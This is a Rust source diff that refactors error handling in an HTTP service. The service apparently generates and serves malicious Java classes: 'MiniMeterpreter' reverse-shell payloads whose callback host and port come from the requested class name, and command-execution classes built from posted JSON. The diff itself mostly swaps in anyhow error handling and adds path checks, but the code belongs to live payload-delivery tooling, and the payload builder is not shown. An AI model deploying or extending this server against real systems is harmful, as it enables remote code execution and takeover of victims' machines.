@@ -6,38 +6,10 @@ use hyper::server::conn::Http;
 
 use hyper::service::service_fn;
 use hyper::{Body, Method, Request, Response, StatusCode};
-use std::io::Error as IoError;
-use std::error::Error;
-use core::fmt::Display;
-use serde::Deserialize;
+use anyhow::Context;
+use anyhow;
 
 use serde_json;
-
-#[derive(Debug)]
-enum WSError{
-    IoError(IoError),
-    ReadBody,
-    Json,
-    Cache,
-}
-impl Display for WSError{
-    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
-        match self {
-            WSError::IoError(io) => write!(f, "{}", io),
-            WSError::ReadBody => write!(f, "Error reading request body"),
-            WSError::Json => write!(f, "Error Converting request body to JSON"),
-            WSError::Cache => write!(f, "Error createing or saving cached class"),
-        }
-    }
-}
-
-impl std::error::Error for WSError{}
-
-impl From<std::io::Error> for WSError{
-    fn from(err : std::io::Error) -> WSError{
-        WSError::IoError(err)
-    }
-}
 
 #[derive(Clone)]
 struct WebService{
@@ -53,7 +25,7 @@ impl WebService{
         }
     }
     /// Serve a request.
-    pub async fn serve(self, req: Request<Body>) -> Result<Response<Body>, WSError> {
+    pub async fn serve(self, req: Request<Body>) -> Result<Response<Body>, anyhow::Error> {
         println!("We have  request {} : {}", req.method(), req.uri().path());
         match (req.method(), req.uri().path()) {
             // Serve some instructions at /
@@ -88,54 +60,44 @@ impl WebService{
         }
     }
 
-    async fn not_found(&self) -> Result<Response<Body>, WSError>{
+    async fn not_found(&self) -> Result<Response<Body>, anyhow::Error>{
         let mut not_found = Response::default();
         *not_found.status_mut() = StatusCode::NOT_FOUND;
         Ok(not_found)
     }
 
-    async fn body_as_string(&self, req: Request<Body>) -> Result<String, WSError>{
-        if let Ok(raw_body) =  hyper::body::to_bytes(req.into_body()).await {
-            if let Ok(s) = String::from_utf8(raw_body.to_vec()){
-                return Ok(s);
-            }
-        }
-        Err(WSError::ReadBody)
+    async fn body_as_string(&self, req: Request<Body>) -> Result<String, anyhow::Error>{
+        let raw_body =  hyper::body::to_bytes(req.into_body()).await.context("Error converting body as string")?;
+        String::from_utf8(raw_body.to_vec()).context("Error reading body as string")
     }
 
-    async fn process_mm(&self, req : Request<Body>) -> Result<Response<Body>, WSError>{
-        let class_name = &req.uri().path()[1..]; 
-        let parts : Vec<&str> = class_name.split("_").collect();
-        if parts.len() < 3 {
+    async fn process_mm(&self, req : Request<Body>) -> Result<Response<Body>, anyhow::Error>{
+        let path = &req.uri().path();
+        if ! ( path.starts_with("/MM_") && path.ends_with(".class") ){
+            return Err(anyhow::Error::msg("Invalid MiniMeterpreter clss name"));
+        }
+        let class_name = &req.uri().path()[1..];
+        let parts : Vec<&str> = class_name[0..class_name.len()-".class".len()].split("_").collect();
+        let last = parts.len()-1;
+        let port = &parts[last];
+        if parts.len() < 3 || class_name.contains("/")  || port.parse::<u16>().is_err() {
             println!("Error : unable to create MM class. {} is invalid.", req.uri().path());
             return self.not_found().await;
         }
         println!("we are processing a MM");
-        let last = parts.len()-1;
         let host = &parts[1..last].join(".");
-        let port = &parts[last];
-        if let Ok(the_class) = build_java::build_mm_class(&class_name, &host, &port) { 
-            self.cfg.class_cache.set_class(class_name.to_string(), the_class.clone());
-            Ok(Response::new(Body::from(the_class)))
-        } else {
-            return Err(WSError::Cache);
-        }
+        let the_class = build_java::build_mm_class(&class_name, &host, &port);
+        self.cfg.class_cache.set_class(class_name.to_string(), the_class.clone());
+        Ok(Response::new(Body::from(the_class)))
     }
 
-    async fn build_cmd(&self, req: Request<Body>) -> Result<Response<Body>, WSError> {
+    async fn build_cmd(&self, req: Request<Body>) -> Result<Response<Body>, anyhow::Error> {
         let body = self.body_as_string(req).await?;
-
-        if let Ok(build_cmd) = serde_json::from_str::<BuildCmdCfg>(&body) {
-            if let Ok(the_class) = build_java::build_cmd_class(build_cmd.clone()){
-                let class_name = format!("{}.class", build_cmd.class_name);
-                self.cfg.class_cache.set_class(class_name, the_class);
-                return Ok(Response::new(Body::from(format!("Created new class for {:?} -- \n\n\n", build_cmd))));
-            }else{
-                return Err(WSError::Cache);
-            }
-
-        }
-        return Ok(Response::new(Body::from("ERROR READING POST DATA  for build_cmd")));
+        let build_cmd = serde_json::from_str::<BuildCmdCfg>(&body).context("Error parsing json")?;
+        let the_class = build_java::build_cmd_class(build_cmd.clone());
+        let class_name = format!("{}.class", build_cmd.class_name);
+        self.cfg.class_cache.set_class(class_name, the_class);
+        return Ok(Response::new(Body::from(format!("Created new class for {:?} -- \n\n\n", build_cmd))));
     }
 }
 
